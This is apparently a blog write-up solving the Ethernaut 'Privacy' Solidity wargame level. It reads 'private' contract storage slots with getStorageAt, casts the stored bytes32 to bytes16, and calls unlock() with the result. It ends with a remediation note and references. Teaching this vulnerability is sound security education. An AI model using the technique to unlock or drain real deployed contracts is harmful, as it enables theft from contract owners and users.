![Privacy](/assets/img/BigLevel12.svg)

- [Challenge](#challenge)
- [Solution](#solution)
- [Remediation](#remediation)
- [References](#references)
   
# Challenge

The level reads:

> The creator of this contract was careful enough to protect the sensitive areas of its storage.
>
> Unlock this contract to beat the level.
>
> Things that might help:
>
> - Understanding how storage works
> - Understanding how parameter parsing works
> - Understanding how casting works
>
> Tips:
>
> - Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.

And gives us the following contract's code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

# Solution

This level is similar to [Vault](/2023-07-11-ethernaut-08-vault-writeup/). We need to access a "private" variable, but this time is not so straight forward as it is using more complex data types.

First, let's do a quick review on how the storage works in Solidity:

> Solidity storage is like an array of length 2^256. Each slot in the array can store 32 bytes.
>
> Order of declaration and the type of state variables define which slots it will use.

> Statically-sized variables (everything except mapping and dynamically-sized array types) are laid out contiguously in storage starting from position 0. Multiple items that need less than 32 bytes are packed into a single storage slot if possible, according to the following rules:
> 
> - The first item in a storage slot is stored lower-order aligned.
> - Elementary types use only that many bytes that are necessary to store them.
> - If an elementary type does not fit the remaining part of a storage slot, it is moved to the next storage slot.
> - Structs and array data always start a new slot and occupy whole slots (but items inside a struct or array are packed tightly according to these rules).

So, now that we know this. Let's map it to the contract state variables.

At the slot 0 we have `locked` which is a boolean, it occupies just 1 byte, so in theory there are 31 bytes free at slot 0. But, the next variable is `ID`, which is an uint256, these variables have, as their names indicates, 256 bits, which are 32 bytes. Then this variable is not going to fit at the slot 0 and is going to take the whole slot 1. We can verify this, by running the following commands:

```javascript
await web3.eth.getStorageAt(contract.address, 0)
'0x0000000000000000000000000000000000000000000000000000000000000001'
```

This is `locked` which starts with a `true` value (0x01 in hex)

```javascript
await web3.eth.getStorageAt(contract.address, 1)
'0x0000000000000000000000000000000000000000000000000000000064b57258'
```
And this is the `ID` variable.

Now, let's continue with the others, at the slot 2 we have:

```javascript
await web3.eth.getStorageAt(contract.address, 2)
'0x000000000000000000000000000000000000000000000000000000007258ff0a'
```

Let's analyze the slot2, first of all we have `flattening` which is an uint8, meaning that its length is 8 bits, or 1 byte, its value is 10 in decimal, in hex it's 0x0a (notice the last byte of the slot2). Next we have another uint8, the variable `denomination` 255 in decimal is 0xff in hex, again, notice the 2nd least signiticant byte of the slot 2. And last, we have `awkwardness` this is an uint16, 2 bytes, and notice that this variable contains the `block.timestamp` as the variable `ID` but cast into an uint16 instead. Which makes sense as the 3rd and 4th least significant bytes of slot 2 are the same as the last 2 of slot 1. 

Last, we have an array of three byte32 words. As each position of the array is a byte32, then, each position of the array is going to take a full slot, let's see the content of the array:

```javascript
await web3.eth.getStorageAt(contract.address, 3)
'0x9f7915c8fe312775d78205fa953989ea1afcb65613454b7505ef53b81a50c7ea'
```

The slot 3 contains `data[0]`.

```javascript
await web3.eth.getStorageAt(contract.address, 4)
'0x6757c54a3455a660b16202495d1fb08fdc5b3a6b27a96dad2fab8866b88e9493'
```

The slot 4 contains `data[1]`.

```javascript
await web3.eth.getStorageAt(contract.address, 5)
'0x6133fad256a7028cbeafa5265be522940e4c773342906aeed49f08c986c58490'
```

And slot 5 contains `data[2]`.

Now, let's analyze the code of the `unlock()` function. This function takes a "key" as input, which is a bytes16 structure. Then notice that the function compares the input key with the second position of the data array cast into bytes16. If they are equal, it changes the value of `locked` to false. Which is what we need to pass the level. When we cast a bytes32 into a bytes16, solidity will take the first 16 bytes of the bytes32 and put it into the bytes16 variable. In this case: 0x**6133fad256a7028cbeafa5265be52294**0e4c773342906aeed49f08c986c58490

We can confirm it with a small contract that takes a bytes32 variable and casts it into a bytes16.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solver {
    bytes32 public data;
    bytes16 public key;

    constructor (bytes32 _data) {
        data = bytes32(_data);
        key = bytes16(data);
    }
}
```

If we deploy this contract with the content of `data[2]`. We should get the key to pass the level:

![Solver variables after deployment](/assets/img/privacy_data_cast.png)

Now we just need to call unlock with the first half of `data[2]` as input: 

```javascript
await contract.unlock('0x6133fad256a7028cbeafa5265be52294')
```

We can verify that it worked by running any of the following commands:

```javascript
await web3.eth.getStorageAt(contract.address, 0)
'0x0000000000000000000000000000000000000000000000000000000000000000'
```

```javascript
await contract.locked()
false
```

And that's it! We unlocked the contract :D

![Well done](/assets/img/ethernaut_solved.png)

# Remediation

- Any private data should either be stored off-chain, or carefully encrypted.

# References

- [SWC-136](https://swcregistry.io/docs/SWC-136)
- [Contracts](https://docs.soliditylang.org/en/v0.8.17/contracts.html)
- [How to read Ethereum contract storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)
- [Write to Any Slot](https://solidity-by-example.org/app/write-to-any-slot/)
- [Layout of State Variables in Storage](https://docs.soliditylang.org/en/v0.4.24/miscellaneous.html#layout-of-state-variables-in-storage)